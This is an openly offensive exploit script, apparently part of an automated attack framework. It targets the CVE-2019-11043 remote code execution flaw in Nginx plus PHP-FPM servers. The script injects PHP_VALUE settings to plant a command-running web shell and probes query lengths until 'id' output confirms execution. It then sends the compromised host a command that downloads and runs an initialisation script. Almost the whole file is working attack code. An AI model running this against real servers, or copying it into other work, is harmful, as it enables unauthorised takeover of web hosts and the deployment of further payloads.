/*
* This php_rce_cve_2019_11043.tengo is an attack script that attacks target host by php rce bugs
*
*Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。
*而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。
 影响范围
 Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。
 location ~ [^/].php(/|$) { fastcgi_split_path_info ^(.+?.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } }

*global variable:
*attackTarget
*attackScript
*/

fmt  := import("fmt")
http := import("http")
json := import("json")
text := import("text")
attack := import("attack")

PHPCVE2019_11043AttackName := "PHP_RCE_CVE_2019_11043_Attack"
PHPCVE2019_11043AttackType := "PHP_RCE_CVE_2019_11043_Attack"
AttackInitScriptName := "init.sh"

UA := "GoClient"
timeoutMS := 10000

host := attackTarget.ip
port := attackTarget.port
proto := attackTarget.proto

isSSL := proto == "https" ||port==443

client := http.newHttpClient(host,port,isSSL,timeoutMS)

PosOffset := 34
MinQSL := 1500
MaxQSL := 1950
QSLDetectStep := 100
PisosLength   :=100


chain := ["short_open_tag=1",
	"html_errors=0",
	"include_path=/tmp",
	"auto_prepend_file=a",
	"log_errors=1",
	"error_reporting=2",
	"error_log=/tmp/a",
	"extension_dir=\"<?=`\"",
	"extension=\"$_GET[a]`?>\""]

//make attack url
makeAttackUrl := func(phpvalue,qsl,cmd){

    baseUrl := "/index.php"
    pi := "/PHP_VALUE\n" + phpvalue
    addition := ""

    if len(pi)<PosOffset {
        addition = text.repeat(";", PosOffset-len(pi))
    }

    url := baseUrl+pi+addition

    qslDelta := len(http.urlEncode(url)) - len(pi) - len(baseUrl)
    qslPrime := qsl - qslDelta/2 - len(cmd)

    query := cmd + text.repeat("G", qslPrime)

    return baseUrl+"/PHP_VALUE%0a"+phpvalue+addition+"?"+query
}

//is valid php
isPhp := func() {

    request := http.newHttpRequest("get","/index.php").addHeader("User-Agent",UA)

    response := client.send(request)

    return response.getStatusCode() ==200

}

//try to attack
doAttack := func(phpvalue,qsl,psl,cmd) {

    url := makeAttackUrl(phpvalue,qsl,cmd)
    request := http.newHttpRequest("get",url)
    request.addHeader("User-Agent",UA)
    request.addHeader("D-Pisos","8"+text.repeat("=",psl)+"D")
    request.addHeader("Ebut","CBot")

    response := client.send(request)

    return response.getBodyAsString()
}

//make attack process and publish into attack tasks and send into sbot
sendAttackResult := func(cmd,result) {

    attackProcess := attack.newAttackProcess()
    attackProcess.setIP(host)
    attackProcess.setHost(host)
    attackProcess.setPort(port)
    attackProcess.setProto(isSSL?"https":"http")
    attackProcess.setApp("PHP")
    attackProcess.setName(PHPCVE2019_11043AttackName)
    attackProcess.setType(PHPCVE2019_11043AttackType)
    attackProcess.setStatus(0)
    attackProcess.setPayload(cmd)
    attackProcess.setResult(result)
    attackProcess.setDetails("")

    //publish attack process into attack tasks
    attackScript.pubProcess(attackProcess)
}

//make a cmd
makeCmd := func(cmd){

    // must not contain any chars that are encoded (except space)
    newCmd := text.replace(cmd," ","+",-1)

    return fmt.sprintf(`a=bash+-c+'%s'&`,newCmd)
}

main := func(){

    //check is a php
    if isPhp() {

        for ch in chain {
            for qsl := MinQSL;qsl<=MaxQSL;qsl+=QSLDetectStep{

               content := doAttack(ch,qsl,PisosLength,makeCmd("id"))

               if text.contains(content,"uid=") {

                    sendAttackResult("id",content)

                    initDownloadCmd := attackScript.initCmdForLinux(AttackInitScriptName,PHPCVE2019_11043AttackType)
                    doAttack(ch,qsl,PisosLength,makeCmd(initDownloadCmd))
                    return true
               }
            }
        }
    }

    return false
}

main()



